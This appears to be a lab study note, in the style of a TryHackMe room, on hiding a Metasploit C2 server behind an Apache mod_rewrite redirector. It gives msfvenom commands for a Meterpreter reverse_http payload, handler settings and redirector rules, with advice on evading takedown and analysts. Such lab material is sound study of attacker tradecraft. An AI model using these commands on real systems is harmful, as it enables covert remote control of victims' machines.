<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Advanced C2 Setups</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Advanced C2 Setups</h1><br/><p><strong><h1>Advanced C2 Setups</h1></strong></p><p></p><p><strong><h3>There&#39;s Always Room for Improvement</h3></strong></p><p></p><p>As you may have guessed, Metasploit itself is not that great of a C2 server for advanced adversary operations. It&#39;s not as flexible as one would desire; you cannot configure agents to beacon out every X seconds with Y jitter. A Next-Generation Firewall could quickly pick up on this C2 traffic, seeing it&#39;s a constant stream of traffic. In addition, anyone could connect to an HTTP/HTTPS listener and find out relatively quickly what is going on.</p><p></p><p><strong><h3>Command and Control Redirectors </h3></strong></p><p></p><p><strong><h3>What is a Redirector?</h3></strong></p><p></p><p>Before we dive into configuring a Redirector, first, what is it? A Redirector is exactly as it sounds. It&#39;s a server that &quot;Redirects&quot; HTTP/HTTPS requests based on information within the HTTP Request body. In production systems, you may see a &quot;Redirector&quot; in the form of a Load Balancer. This server often runs Apache 2 or NGINX. For this lab, we will be leveraging Apache and some of its modules to build a Redirector.</p><p></p><p>Jumping back into Metasploit, we can set up some basic configurations on Metasploit to allow for more advanced configurations, in this task; we will be setting up a Redirector. Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. The diagram below illustrates how communications between a victim and a C2 server happen.</p><p></p><p><img src="images/382-1.png" alt="images/382-1.png" /></p><p></p><p>Usually, when you have a C2 callback, you may set the callback host to a Domain, let&#39;s say admin.tryhackme.com. It&#39;s very common for your C2 Server to get reported, when a user files a complaint. Usually, the server gets taken down fairly quickly. It can sometimes be as little as 3 hours and as much as 24. Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound. </p><p></p><p>But how does this stop the C2 Server from being taken down? Surely if someone fingerprinted Cobalt Strike on your C2 Server, someone would file a complaint, and it would get taken down. This is true, so you should set up a Firewall to only allow communication to and from your redirector(s) to mitigate any potential risks.</p><p></p><p><img src="images/382-2.png" alt="images/382-2.png" /></p><p></p><p></p><p><strong><h3>How is a Redirector Setup?</h3></strong></p><p></p><p></p><p>Before we dive into configuring a redirector, we must first understand how one is set up; we will be aligning this to the tools we have available, which are Metasploit and Apache2. In Apache, we will be leveraging a module called &quot;mod_rewrite&quot; (or the Rewrite module). This module allows us to write rules to forward requests to internal or external hosts on a server based on specific HTTP headers or content. We will need to use several modules to configure our Redirector. The following modules must be enabled:</p><p></p><p>    <strong>• </strong>rewrite</p><p>    <strong>• </strong>proxy</p><p>    <strong>• </strong>proxy_http</p><p>    <strong>• </strong>headers</p><p></p><p><strong>Note:</strong> If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that Apache listens on in <strong>/etc/apache2/ports.conf</strong>. You must do this before starting the Apache 2 service, or it will fail to start.</p><p>You can install apache 2 and enable it with the following commands:</p><p></p><p><span style="text-decoration:underline;">Commands</span>:</p><p></p><p><strong>apt install apache2</strong></p><p><strong>a2enmod rewrite &amp;&amp; a2enmod proxy &amp;&amp; a2enmod proxy_http &amp;&amp; a2enmod headers &amp;&amp; systemctl start apache2 &amp;&amp; systemctl status apache2</strong></p><p></p><p>Using Meterpreter, we have the ability to configure various aspects of the HTTP Request, for example, the User-Agent. It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. It&#39;s in every HTTP request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark. </p><p></p><p><span style="text-decoration:underline;">Generating a Payload with Modified Headers</span>:</p><p></p><p><strong>msfvenom -p windows/meterpreter/reverse_http LHOST=&lt;Attacker_IP&gt; LPORT=&lt;Port&gt; HttpUserAgent=NotMeterpreter -f exe -o shell.exe</strong></p><p></p><p><img src="images/382-3.png" alt="images/382-3.png" /></p><p></p><p>After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the <strong>HTTP</strong> filter to only view HTTP requests. After it&#39;s started capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.</p><p></p><p><img src="images/382-4.png" alt="images/382-4.png" /></p><p></p><p>Now that we have a field we can control in the HTTP Request, let&#39;s create an Apache2 mod_rewrite rule that filters on the user agent &quot;NotMeterpreter&quot; and forward it to our Metasploit C2 Server.</p><p></p><p></p><p><strong><h3>Modifying the Apache Config File</h3></strong></p><p><strong><h3></h3></strong></p><p>This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. On Debian based systems, the default config can be found at <strong>/etc/apache2/sites-available/000-default.conf.</strong></p><p></p><p><img src="images/382-5.png" alt="images/382-5.png" /></p><p></p><p></p><p>Now that we have a general idea of the Apache2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, and lastly, pass through the Apache 2 Proxy. This sounds fairly complex, but it&#39;s quite simple.</p><p></p><p>To enable the Rewrite Engine, we must add <strong>RewriteEngine</strong> <strong>On</strong> onto a new line in the VirtualHost section.</p><p></p><p>Now we will be using a Rewrite Condition targeting the HTTP User-Agent. For a complete list of HTTP Request Targets, see the mod_rewrite documentation on Apache.org. Because we only want to match the User-Agent &quot;NotMeterpreter&quot;, we need to use some basic Regular Expressions to capture this; adding a <strong>^ signals the beginning</strong> of a string and a <strong>$ at the end</strong> of the series, giving us with &quot;^NotMeterpreter$&quot;. This Regex will only capture the NotMeterpreter User-Agent. We can add this line <strong>RewriteCond %{HTTP_USER_AGENT} &quot;^NotMeterpreter$&quot;</strong> to our config to (as previously stated) only allow HTTP Requests with the NotMeterpreter user agent to access Metasploit.</p><p></p><p>Lastly, we must forward the request through Apache2, through our proxy, to Metasploit. To do this, we must use the ProxyPass feature of Apache&#39;s <strong>mod_proxy</strong> module. To do this, we just need to specify the base URI that the request will be forwarded to (in our case, we just need &quot;/&quot;), and the target we want to forward the request to. This will vary from setup to set up, but this IP Address will be your C2 server. In the lab scenario, it will be localhost and port that Metasploit is listening on. This will give us a full config file that looks like so:</p><p></p><p><img src="images/382-6.png" alt="images/382-6.png" /></p><p></p><p><span style="text-decoration:underline;">Changes</span>:</p><p></p><p><strong>	RewriteEngine On</strong></p><p><strong>	RewriteCond %{HTTP_USER_AGENT} &quot;^NotMeterpreter$&quot;</strong></p><p><strong>	ProxyPass &quot;/&quot; &quot;http://localhost:8080/&quot;</strong></p><p>	</p><p>	</p><p><strong><h3>Setting Up Exploit/Multi/Handler</h3></strong></p><p></p><p>To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. For the lab, we will be using TCP/8080; this can be whatever you like in production. As always, the best practice is to run services over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.</p><p></p><p>Next, we need to set up OverrideLHOST - This value will be your redirector&#39;s IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port that the HTTP or HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your C2 server. Now that you understand what must be configured, let&#39;s dive into it:</p><p></p><p><img src="images/382-7.png" alt="images/382-7.png" /></p><p></p><p>fter this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector! For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use multiple hosts and DNS records instead of IP Addresses. </p><p></p><p><img src="images/382-8.png" alt="images/382-8.png" /></p><p></p><p></p><p></p><p><strong><h2>Practical Example:</h2></strong></p><p></p><p>Kali Machine: Metasploit C2 Server [<strong>11.11.11.100</strong>]</p><p>Parrot Machine: Redirector [<strong>11.11.11.103</strong>]</p><p>Windows 7 Machine: Victim [<strong>11.11.11.120</strong>]</p><p></p><p><strong><span style="text-decoration:underline;">Payload:</span></strong></p><p></p><p>Payload is generated targeted at Redirector machine.</p><p></p><p><strong>msfvenom -p windows/meterpreter/reverse_http LHOST=11.11.11.103 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o redirector.exe</strong></p><p></p><p><img src="images/382-9.png" alt="images/382-9.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Parrot Machine:</span></strong></p><p></p><p>Here, The Apache Proxy would run.</p><p></p><p><strong>a2enmod rewrite &amp;&amp; a2enmod proxy &amp;&amp; a2enmod proxy_http &amp;&amp; a2enmod headers &amp;&amp; systemctl start apache2 &amp;&amp; systemctl status apache2</strong></p><p></p><p>Then, Edit <strong>/etc/apache2/sites-available/000-default.conf</strong> &amp; add the following inside <strong>VirtualHost</strong></p><p></p><p><strong>	RewriteEngine On</strong></p><p><strong>	RewriteCond %{HTTP_USER_AGENT} &quot;^NotMeterpreter$&quot;</strong></p><p><strong>	ProxyPass &quot;/&quot; &quot;http://11.11.11.100:8080/&quot;</strong></p><p></p><p>Then, restart apache2 server again to reload the configurations.	</p><p>	</p><p><strong>systemctl restart apache2</strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Kali Machine:</span></strong></p><p></p><p>Start Msfconsole</p><p></p><p><strong>use exploit/multi/handler</strong></p><p><strong>set PAYLOAD windows/meterpreter/reverse_http</strong></p><p><strong>set LHOST 11.11.11.100</strong></p><p><strong>set LPORT 8080</strong></p><p><strong>set ReverseListenerBindAddress 11.11.11.100</strong></p><p><strong>set ReverseListenerBindPort 8080</strong></p><p><strong>set OverrideLHOST 11.11.11.103</strong></p><p><strong>set OverrideLPORT 80</strong></p><p><strong>set HTTPUserAgent NotMeterpreter</strong></p><p><strong>run</strong></p><p></p><p><img src="images/382-10.png" alt="images/382-10.png" /></p><p></p><p><strong><span style="text-decoration:underline;">Windows Machine:</span></strong></p><p></p><p>When we open the redirector website on Port 80, A normal website loads. [For Blue Teamers]</p><p>This happens because the <strong>HTTPUserAgent</strong> needs to be <strong>“NotMeterpreter”</strong> for our proxy to send it to our Metasploit C2 Sever</p><p><img src="images/382-11.png" alt="images/382-11.png" /></p><p></p><p>Now, if we run the redirector.exe payload. (It was configured in msfvenom to have <strong>“NotMeterpreter”</strong> as <strong>HTTPUserAgent</strong>)</p><p>We will get a connection into the C2 server [Parrot Machine is the Redirector in between]</p><p></p><p><strong><span style="text-decoration:underline;">Kali Machine:</span></strong></p><p></p><p><img src="images/382-12.png" alt="images/382-12.png" /></p><p></p><p>As we can see we have access to the windows machine throught the Parrot Machine as redirector.</p></div>
</body>
</html>
